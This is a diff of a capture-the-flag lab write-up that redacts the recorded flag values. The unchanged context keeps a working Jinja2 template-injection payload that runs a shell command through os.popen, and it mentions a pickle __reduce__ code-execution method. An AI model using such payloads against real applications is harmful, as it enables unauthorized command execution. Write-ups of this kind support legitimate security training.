@@ -22,7 +22,7 @@ The application evaluates user input directly within Python's Jinja2 templating 
 {{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
 ```
 Executing this payload returns the flag from the local directory:
-`THM{SSTI_FLAG_OBTAINED}`
+`flag{hidden}`
 
 ---
 
@@ -49,5 +49,5 @@ Submitting the serialized payload forces the web application to execute system c
 | Task | Vulnerability Type | Solution Method |
 |---|---|---|
 | **Task 2** | A04: Cryptographic Failures | Decrypted Base64 XOR notes using static key `key1` |
-| **Task 3** | A05: Server-Side Template Injection | Jinja2 SSTI payload: `THM{SSTI_FLAG_OBTAINED}` |
+| **Task 3** | A05: Server-Side Template Injection | Jinja2 SSTI payload: `flag{hidden}` |
 | **Task 4** | A08: Insecure Deserialization | Python `pickle` payload leveraging `__reduce__` RCE |
